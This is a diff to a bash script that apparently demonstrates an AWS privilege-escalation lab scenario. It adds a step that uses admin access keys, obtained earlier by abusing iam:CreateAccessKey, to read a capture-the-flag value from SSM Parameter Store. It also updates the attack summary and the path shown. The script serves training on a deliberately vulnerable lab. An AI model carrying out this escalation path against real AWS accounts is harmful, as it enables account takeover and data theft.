@@ -208,21 +208,43 @@ else
 fi
 echo ""
 
+# [EXPLOIT] Step 8: Capture the CTF flag
+# The attacker now holds the admin user's fresh access keys (NEW_ACCESS_KEY / NEW_SECRET_KEY),
+# which carry AdministratorAccess. Use those credentials to read the scenario flag from
+# SSM Parameter Store — no additional credential-creation or assume-role step needed.
+echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
+unset AWS_SESSION_TOKEN
+export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY
+export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
+export AWS_REGION=$AWS_REGION
+FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-002-to-admin"
+show_attack_cmd "Attacker (admin user)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
 # Restore helpful permissions for manual exploration
 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
 # Final summary
 echo -e "\n${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Attack Summary:${NC}"
 echo "1. Started as: $STARTING_USER (limited permissions)"
 echo "2. Used iam:CreateAccessKey to create credentials for: $ADMIN_USER"
 echo "3. Switched to new admin credentials"
 echo "4. Achieved: Full administrator access"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
-echo "  $STARTING_USER → (iam:CreateAccessKey) → $ADMIN_USER → Admin Access"
+echo "  $STARTING_USER → (iam:CreateAccessKey) → $ADMIN_USER → Admin Access → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
